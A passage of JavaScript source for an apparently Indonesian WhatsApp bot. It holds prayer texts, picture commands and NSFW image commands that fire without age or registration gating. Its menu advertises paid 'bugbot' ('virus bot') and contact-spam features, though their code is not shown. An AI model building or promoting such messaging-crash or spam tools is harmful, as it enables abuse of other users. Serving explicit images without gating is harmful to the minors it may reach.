اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
m.reply(caption)
}
break



case 'doaharian': {
 let src = JSON.parse(fs.readFileSync('./database/doaharian.json', 'utf-8'))
 let caption = src.map((v, i) => {
 return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
 }).join('\n\n')
 Reply(`${caption}`)

}
break



case 'niatsholat': {
 if (!q) return m.reply(`Contoh Penggunaan :\nniatsholat Subuh\nmaghrib\ndzuhur`)
const niatsholat = [
 {
 index: 1,
 solat: "subuh",
 latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
 arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
 translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
 },
 {
 index: 2,
 solat: "maghrib",
 latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
 arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
 translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
 },
 {
 index: 3,
 solat: "dzuhur",
 latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
 arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
 translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
 },
 {
 index: 4,
 solat: "isha",
 latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
 arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
 translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
 },
 {
 index: 5,
 solat: "ashar",
 latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
 arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
 translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
 }
]
 let text = q.toLowerCase() || ''
 let data = Object.values(niatsholat).find(v => v.solat == text)
 if (!data) return m.reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
 reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break



case 'kisahnabi': {
 if (!text) return replynano(`Masukan nama nabi\nExample: kisahnabi adam`)
 let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
 let kisah = await url.json().catch(_ => "Error")
 if (kisah == "Error") return reply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
 
 let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

 *\`乂 K I S A H 乂\`*

${kisah.description}`

 reply(`${hasil}`)

}
break



case 'menu-list':
			case 'adiett':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: "silahkan pilihh"
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.pathimg }, { upload: Ditss.waUploadToServer })), 
									title: '',
									subtitle: '',
									hasMediaAttachment: false
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
                                    {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'List Fitur','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'menu Bugbot 🔥','description':'fitur ini adalah fitur bugbot atau bisa di sebut virus bot','id':'.cmd bug'}]},{'highlight_label':'Berbayar','rows':[{'header':'','title':'menu Pushkontak 🔥','description':'fitur ini adalah fitur spam seperti bc/broadcast bedanya pakai id group','id':'.cmd pushkontak'}]},{'highlight_label':'Berbayar','rows':[{'header':'','title':'menu Store 🔥','description':'fitur ini adalah fitur shop/jualan, jangan lupa beli yah','id':'.cmd store'}]},{'highlight_label':'Berbayar','rows':[{'header':'','title':'menu Linode 🔥','description':'fitur ini adalah fitur linode create vps','id':'.cmd linode'}]},{'highlight_label':'Berbayar','rows':[{'header':'','title':'menu Domain 🔥','description':'fitur ini adalah fitur subdo biasanya di buat panel','id':'.cmd subdomain'}]},{'highlight_label':'Berbayar','rows':[{'header':'','title':'menu Jadibot 🔥','description':'fitur ini adalah fitur clone bot atau membuat bot lagi tanpa ribet','id':'.cmd jadibot'}]},{'title':'Pilihan Free!','rows':[{'header':'','title':'semua Menu 🐣','description':'tampilkan semua fitur² bot','id':'.menuall'},{'header':'','title':'menu Jaga Grub 🐣','description':'menampilakan sebuah fitur-fitur jaga grub bot','id':'.cmd jagagrub'},{'header':'','title':'menu Fun 🐣','description':'menampilakan sebuah fitur-fitur fun bot','id':'.cmd fun'},{'header':'','title':'senu Rpg🐣','description':'menampilakan sebuah fitur-fitur rpg bot','id':'.cmd rpg'},{'header':'','title':'menu Tools 🐣','description':'menampilakan sebuah fitur-fitur tools','id':'.cmd tools'},{'header':'','title':'menu Shop 🐣','description':'menampilakan sebuah fitur-fitur shop bot','id':'.cmd shop'},{'header':'','title':'menu Game 🐣','description':'menampilakan sebuah fitur-fitur game bot','id':'.cmd game'},{'header':'','title':'menu Anime 🐣','description':'menampilakan sebuah fitur-fitur anime bot','id':'.cmd anime'},{'header':'','title':'menu Group 🐣','description':'menampilakan sebuah fitur-fitur group bot','id':'.cmd group'},{'header':'','title':'menu Owner 🐣','description':'menampilakan sebuah fitur-fitur owner bot','id':'.cmd owner'},{'header':'','title':'menu Primbon 🐣','description':'menampilakan sebuah fitur-fitur primbon bot','id':'.cmd primbon'},{'header':'','title':'menu Convert 🐣','description':'menampilakan sebuah fitur-fitur convert bot','id':'.cmd convert'},{'header':'','title':'menu Ephoto 🐣','description':'menampilakan sebuah fitur-fitur ephoto bot','id':'.cmd ephoto'},{'header':'','title':'menu Search 🐣','description':'menampilakan sebuah fitur-fitur search bot','id':'.cmd search'},{'header':'','title':'menu Ai 🐣','description':'menampilakan sebuah fitur-fitur ai bot','id':'.cmd chatbot'},{'header':'','title':'menu Photoxy 🐣','description':'menampilakan sebuah fitur-fitur photoxy bot','id':'.cmd photoxy'},{'header':'','title':'menu Random 🐣','description':'menampilakan sebuah fitur-fitur random bot','id':'.cmd random'},{'header':'','title':'menu Audio 🐣','description':'menampilakan sebuah fitur-fitur audio bot','id':'.cmd audio'},{'header':'','title':'menu Sound 🐣','description':'menampilakan sebuah fitur-fitur sound bot','id':'.cmd sound'},{'header':'','title':'menu Download 🐣','description':'menampilakan sebuah fitur-fitur download bot','id':'.cmd download'},{'header':'','title':'menu Text Pro 🐣','description':'menampilakan sebuah fitur-fitur text pro bot','id':'.cmd textpro'}]}]}"
              },      
				{
 "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"aku lahh raja jomokk😈\",\"title\":\"back menu utamaa\",\"id\":\".botjelek\"}" 
										}
	
/* buttonId: ".inpo", 
 buttonText: {
 displayText: 'info bot'
 }
 }, {
 buttonId: ".jodoh", 
 buttonText: {
 displayText: "gabut"
 }
 }*/								],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "menu listt",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Ditss.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			break







case 'quotesanime':
case 'quotesanim': {
 let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
 if (!res.ok) return await res.text()
 let json = await res.json()
 if(!json.result[0]) return json
 let { indo, character, anime } = json.result[0]
 Reply(`${indo}\n\n📮By: _${character}_ \nAnime:\n${anime}`)
}
break



case 'vtuber': {
if (!text) return reply(`Example ${prefix+command} kobo kanaeru`)
const { wiki } = require("vtuber-wiki");
async function getVTuber(vtuber) {
 try {
 const result = await wiki(vtuber);
 if (!result.image_url) return { error: "No such vTuber" };
 return result;
 } catch (err) {
 return { error: "No such vTuber" };
 }
}
try {
let tuber = await getVTuber(text)
let pituber = `[ *VTUBER WIKI* ]

Judul: ${tuber.title}
Link: ${tuber.url}
Author: ${tuber.author}
Account: ${tuber.account}
Date: ${tuber.date}
Type: ${tuber.type}
Channel: ${tuber.channel}
Social Media: ${tuber.social_media}
Offcial Website: ${tuber.official_website}
Gender: ${tuber.gender}
Age: ${tuber.age}
Description: ${tuber.description}
More: ${tuber.more}
`

Ditss.sendMessage(m.chat, {image: {url: tuber.image_url}, caption: pituber}, {quoted: qkontak})
} catch (e) {
 m.reply(e)
}
}
break



// FITUR ASUPAN
case 'tiktokgirl':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var asupan = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokvids/tiktokgirl.json'))
var ii = pickRandom(asupan)
Ditss.sendMessage(m.chat, { caption: 'don banh', video: { url: ii.url }}, { quoted: m })
break
case 'tiktokghea':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var gheayubi = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokvids/gheayubi.json'))
var iii = pickRandom(gheayubi)
Ditss.sendMessage(m.chat, { caption: 'don banh', video: { url: iii.url }}, { quoted: m })
break
case 'tiktokbocil':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var bocil = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokvids/bocil.json'))
var iiii = pickRandom(bocil)
Ditss.sendMessage(m.chat, { caption: 'don banh', video: { url: iiii.url }}, { quoted: m })
break
case 'tiktoknukhty':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var ukhty = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokvids/ukhty.json'))
var iiiii = pickRandom(ukhty)
Ditss.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiii.url }}, { quoted: m })
break
case 'tiktoksantuy':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var santuy = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokvids/santuy.json'))
var iiiiii = pickRandom(santuy)
Ditss.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiii.url }}, { quoted: m })
break
case 'tiktokkayes':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var kayes = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokvids/kayes.json'))
var iiiiiii = pickRandom(kayes)
Ditss.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiii.url }}, { quoted: m })
break
case 'tiktokpanrika':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var rikagusriani = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokvids/panrika.json'))
var iiiiiiii = pickRandom(rikagusriani)
Ditss.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiiii.url }}, { quoted: m })
break
case 'tiktoknotnot':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokvids/notnot.json'))
var iiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiiiii.url }}, { quoted: m })
break
case 'chinese':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokpics/china.json'))
var iiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiii.url } }, { quoted: m })
break
case 'hijab':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokpics/hijab.json'))
var iiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiii.url } }, { quoted: m })
break

case 'indo':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokpics/indonesia.json'))
var iiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiii.url } }, { quoted: m })
break
case 'japanese':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokpics/japan.json'))
var iiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiii.url } }, { quoted: m })
break
case 'korean':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokpics/korea.json'))
var iiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'malay':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokpics/malaysia.json'))
var iiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomgirl':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokpics/random.json'))
var iiiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomboy':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokpics/random2.json'))
var iiiiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'thai':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokpics/thailand.json'))
var iiiiiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'vietnamese':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/tiktokpics/vietnam.json'))
var iiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'aesthetic':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/aesthetic.json'))
var iiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'antiwork':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/antiwork.json'))
var iiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'blackpink2':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/blackpink.json'))
var iiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'bike':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/bike.json'))
var iiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'boneka':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/boneka.json'))
var iiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cosplay':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./resource/randompics/cosplay.json'))
var iiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cat':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/cat.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'doggo':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/doggo.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiil = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiil.url } }, { quoted: m })
break
case 'justina':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/justina.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiill = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiill.url } }, { quoted: m })
break

case 'kayes':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/kayes.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiilll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiilll.url } }, { quoted: m })
break
case 'kpop':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/kpop.json'))
var ll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: ll.url } }, { quoted: m })
break
case 'notnot':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/notnot.json'))
var lll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: lll.url } }, { quoted: m })
break
case 'car':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/car.json'))
var llll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: llll.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/ppcouple.json'))
var lllll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: lllll.url } }, { quoted: m })
break
case 'profilepic': case 'profilepicture':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/profile.json'))
var llllll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: llllll.url } }, { quoted: m })
break
case 'pubg':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/pubg.json'))
var lllllll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllll.url } }, { quoted: m })
break
case 'rose':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/rose.json'))
var llllllll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllll.url } }, { quoted: m })
break
case 'ryujin':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/ryujin.json'))
var lllllllll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllll.url } }, { quoted: m })
break
case 'ulzzangboy':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/ulzzangboy.json'))
var llllllllll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllll.url } }, { quoted: m })
break
case 'ulzzanggirl':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/ulzzanggirl.json'))
var lllllllllll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllll.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/wallml.json'))
var llllllllllll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllllll.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-asuma/resource/randompics/wallhp.json'))
var lllllllllllll = pickRandom(notnot)
Ditss.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllllll.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hentai':
case 'hneko' :
//if (!isRegistered) return registerbut(noregis)
 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd2.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
 let waifudd3 = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd3.data.url } }, { quoted: m })
break
case 'gasm':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})						
 let waifudd4 = await axios.get(`https://nekos.life/api/v2/img/${command}`)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd4.data.url } }, { quoted: m })
break 
case 'milf':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/milf.json'))
var kymyresult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: kymyresult.url } }, { quoted: m })
break 
case 'animespank':				
	//if (!isRegistered) return registerbut(noregis)
 let waifudd5 = await await axios.get(`https://nekos.life/api/v2/img/spank`) 
 Ditss.sendMessage(m.chat, { caption: `Here you go!`, image: {url:waifudd5.data.url} },{ quoted:m }).catch(err => {
 return('Error!')
 })
break



case 'delppbot': {
if (!isCreator) return pesan(mess.owner)
await Ditss.removeProfilePicture(Ditss.user.id)
reply(`Berhasil Menghapus Gambar Profil Bot`)
}
break



case 'speed': case 'ping':{
try {
const used = process.memoryUsage();
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed();
let latensi = speed() - timestamp;
let neww = performance.now();
let tio = await nou.os.oos();
let oldd = performance.now();
var tot = await nou.drive.info();
let respon = `*乂 JARINGAN SERVER*
- Ping: ${latensi.toFixed(4)} Detik

*乂 INFO SERVER*
- OS: Linux
- IP Address: -
- Type OS: Ubuntu

*乂 RAM :*
- Total: ${formatp(os.totalmem())}
- Digunakan: ${formatp(os.totalmem() - os.freemem())}

*乂 PENYIMPANAN :*
- Total: ${tot.totalGb} GB
- Digunakan: ${tot.usedGb} GB (${tot.usedPercentage}%)
- Tersedia: ${tot.freeGb} GB (${tot.freePercentage}%)

*乂 RUNTIME SERVER*
Aktif:
${runtime(process.uptime())}

*乂 CPU USAGE (${cpus.length} CORE CPU)*
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}

> ${footer}`.trim();
